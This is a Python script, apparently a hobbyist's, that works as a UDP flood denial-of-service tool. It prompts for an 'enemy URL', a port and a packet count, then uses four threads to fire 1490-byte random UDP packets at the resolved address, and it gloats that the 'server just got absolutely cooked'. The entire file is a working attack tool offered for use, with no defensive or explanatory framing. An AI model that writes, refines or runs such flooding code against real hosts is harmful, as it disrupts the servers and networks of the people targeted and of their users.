import os
import threading
import socket
from urllib.parse import urlparse

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()
print("""
    **********************
    *     X_X            *
    * Made by Mystic-poop*
    *                    *
    *                    *
    *                    *
    **********************
    """)
url = input("Write your enemy URL (with http:// or https://): ")
parsed_url = urlparse(url)
gonnacooked = parsed_url.hostname
        
whichport = int(input("Which port do you want to attack? "))  
amountofnukes = int(input("How many nukes to send? "))
ip = socket.gethostbyname(gonnacooked)
            
target = (ip, whichport)

def nukinrn():
    clear_screen()
    print(f"[+] Target: {target[0]}:{target[1]}")
    print(f"[+] Nukes Ready: {amountofnukes}")
    print("-" * 40)

nukinrn() 

total_nukes_sent = 0
lock = threading.Lock()

def start_attack(nukes_to_send):
    global total_nukes_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Individual socket per thread
    bytes = os.urandom(1490)
    nukes_sent = 0
    
    while nukes_sent < nukes_to_send:
        sock.sendto(bytes, target)
        nukes_sent += 1
        
        with lock:
            total_nukes_sent += 1
            if total_nukes_sent % 50 == 0:
                print(f"\rNukes Sent: {total_nukes_sent}/{amountofnukes}", end='', flush=True)

num_threads = 4
per_thread, remainder = divmod(amountofnukes, num_threads)

threads = []
for i in range(num_threads):
    thread_nukes = per_thread + 1 if i < remainder else per_thread
    t = threading.Thread(target=start_attack, args=(thread_nukes,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"\nTotal nukes delivered: {total_nukes_sent}")
print("Server just got absolutely cooked💀")
